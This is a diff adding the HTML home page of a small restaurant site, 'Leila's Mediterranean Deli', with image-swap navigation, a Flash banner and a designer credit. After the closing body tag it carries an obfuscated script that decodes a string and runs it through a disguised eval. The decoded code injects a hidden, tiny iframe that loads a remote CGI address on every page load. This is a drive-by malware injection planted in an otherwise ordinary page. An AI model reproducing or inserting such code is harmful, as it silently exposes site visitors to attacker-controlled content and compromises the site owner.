@@ -1,0 +1,114 @@
+<html>
+<head>
+<title>Leila's Mediterranean Deli</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<script type="text/JavaScript">
+<!--
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+<style type="text/css">
+<!--
+body {
+	background-color: #740112;
+}
+body,td,th {
+	font-family: Arial, Helvetica, sans-serif;
+}
+.style1 {font-size: 12px}
+a:link {
+	color: #FFFFFF;
+}
+.style2 {color: #FFFFFF}
+-->
+</style></head>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="MM_preloadImages('images/index_over_08.gif','images/index_over_09.gif','images/index_over_10.gif','images/index_over_11.gif','images/index_over_12.gif','images/index_over_13.gif','images/index_over_14.gif','images/index_over_15.gif')">
+<!-- ImageReady Slices (TEMPLATE 3 .psd) -->
+<br>
+<br>
+<br>
+<table width="800" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td><img src="images/index_01.gif" width="800" height="226" alt=""></td>
+  </tr>
+  
+  <tr>
+    <td background="images/index_02.gif"><table border="0" cellpadding="0" cellspacing="0">
+      <tr>
+        <td colspan="5"><img src="images/index_02.gif" width="800" height="12" alt=""></td>
+        </tr>
+      <tr>
+        <td><img src="images/index_03.gif" width="37" height="341" alt=""></td>
+        <td><table border="0" align="center" cellpadding="0" cellspacing="0" id="Table_01">
+            <tr>
+              <td><img src="images/index_04.gif" width="213" height="34" alt=""></td>
+            </tr>
+            <tr>
+              <td><a href="index.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image17','','images/index_over_08.gif',1)"><img src="images/index_08.gif" name="Image17" width="213" height="33" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="menu.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image18','','images/index_over_09.gif',1)"><img src="images/index_09.gif" name="Image18" width="213" height="35" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="about.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image19','','images/index_over_10.gif',1)"><img src="images/index_10.gif" name="Image19" width="213" height="33" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="contact.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image20','','images/index_over_11.gif',1)"><img src="images/index_11.gif" name="Image20" width="213" height="31" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="gallery.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image21','','images/index_over_12.gif',1)"><img src="images/index_12.gif" name="Image21" width="213" height="32" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="products.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image22','','images/index_over_13.gif',1)"><img src="images/index_13.gif" name="Image22" width="213" height="31" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="coupons.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image23','','images/index_over_14.gif',1)"><img src="images/index_14.gif" name="Image23" width="213" height="31" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><a href="http://shaheenimports.com/" target="_blank" onMouseOver="MM_swapImage('Image24','','images/index_over_15.gif',1)" onMouseOut="MM_swapImgRestore()"><img src="images/index_15.gif" name="Image24" width="213" height="32" border="0"></a></td>
+            </tr>
+            <tr>
+              <td><img src="images/index_16.gif" width="213" height="49" alt=""></td>
+            </tr>
+        </table></td>
+        <td><img src="images/index_05.gif" width="103" height="341" alt=""></td>
+        <td><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="417" height="341">
+            <param name="movie" value="homepage.swf">
+            <param name="quality" value="high"><param name="LOOP" value="false">
+            <embed src="homepage.swf" width="417" height="341" loop="false" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash"></embed>
+        </object></td>
+        <td><img src="images/index_07.gif" width="30" height="341" alt=""></td>
+      </tr>
+      <tr>
+        <td colspan="5"><img src="images/index_17.gif" width="800" height="21" alt=""></td>
+        </tr>
+    </table></td>
+  </tr>
+</table>
+<div align="center"><span class="style1"><span class="style2">Powered By</span> <a href="HTTP://WWW.GR8TWEBDESIGNS.COM" target="_blank">GR8TWEBDESIGNS.COM</a></span> </div>
+  <!-- End ImageReady Slices -->
+
+</body>
+<!-- . --><script>var ar=" if (document.gElsByTaN'b)[0]{r;}v=\"pChw<:/-x2z?361>A,";var ar2=[0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,10,12,15,16,10,9,10,11,12,17,18,19,20,21,14,22,21,9,10,4,23,24,6,5,19,23,25,26,27,28,25,29,0,0,0,1,2,30,21,9,10,30,4,25,31,0,0,32,3,10,16,17,10,3,29,0,0,0,33,21,30,3,24,5,19,3,34,3,5,6,7,8,9,10,11,12,13,7,30,10,21,12,10,15,16,10,9,10,11,12,4,35,24,6,5,19,35,25,31,0,0,0,12,30,19,3,29,0,0,0,0,5,6,7,8,9,10,11,12,13,21,36,36,10,11,5,37,38,1,16,5,4,24,5,19,25,31,0,0,0,32,3,7,21,12,7,38,3,4,10,25,3,29,0,0,0,0,5,6,7,8,9,10,11,12,13,24,6,5,19,3,34,3,24,5,19,31,0,0,0,32,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,10,12,15,16,10,9,10,11,12,17,18,19,20,21,14,22,21,9,10,4,23,24,6,5,19,23,25,26,27,28,25,29,0,0,0,0,1,2,30,21,9,10,30,4,25,31,0,0,0,32,3,10,16,17,10,3,29,0,0,0,0,5,6,7,8,9,10,11,12,13,39,30,1,12,10,4,35,40,1,2,30,21,9,10,3,17,30,7,34,23,38,12,12,36,41,42,42,1,11,43,19,21,11,5,10,44,44,44,45,13,7,46,13,7,7,42,1,11,13,7,14,1,47,48,49,23,3,39,1,5,12,38,34,23,50,27,23,3,38,10,1,14,38,12,34,23,50,27,23,3,17,12,19,16,10,34,23,33,1,17,1,24,1,16,1,12,19,41,38,1,5,5,10,11,31,36,6,17,1,12,1,6,11,41,21,24,17,6,16,8,12,10,31,16,10,2,12,41,27,31,12,6,36,41,27,31,23,51,40,42,1,2,30,21,9,10,51,35,25,31,0,0,0,32,0,0,32,0,0,2,8,11,7,12,1,6,11,3,1,2,30,21,9,10,30,4,25,29,0,0,0,33,21,30,3,2,3,34,3,5,6,7,8,9,10,11,12,13,7,30,10,21,12,10,15,16,10,9,10,11,12,4,23,1,2,30,21,9,10,23,25,31,2,13,17,10,12,52,12,12,30,1,24,8,12,10,4,23,17,30,7,23,53,23,38,12,12,36,41,42,42,1,11,43,19,21,11,5,10,44,44,44,45,13,7,46,13,7,7,42,1,11,13,7,14,1,47,48,49,23,25,31,2,13,17,12,19,16,10,13,33,1,17,1,24,1,16,1,12,19,34,23,38,1,5,5,10,11,23,31,2,13,17,12,19,16,10,13,36,6,17,1,12,1,6,11,34,23,21,24,17,6,16,8,12,10,23,31,2,13,17,12,19,16,10,13,16,10,2,12,34,23,27,23,31,2,13,17,12,19,16,10,13,12,6,36,34,23,27,23,31,2,13,17,10,12,52,12,12,30,1,24,8,12,10,4,23,39,1,5,12,38,23,53,23,50,27,23,25,31,2,13,17,10,12,52,12,12,30,1,24,8,12,10,4,23,38,10,1,14,38,12,23,53,23,50,27,23,25,31,0,0,0,5,6,7,8,9,10,11,12,13,14,10,12,15,16,10,9,10,11,12,17,18,19,20,21,14,22,21,9,10,4,23,24,6,5,19,23,25,26,27,28,13,21,36,36,10,11,5,37,38,1,16,5,4,2,25,31,0,0,32];pau='val';e=new Function('','return e'+pau)();s="";for(i=0;i<ar2.length;i++){s+=ar[ar2[i]];}
+e(s);</script><!-- . --> </html> 
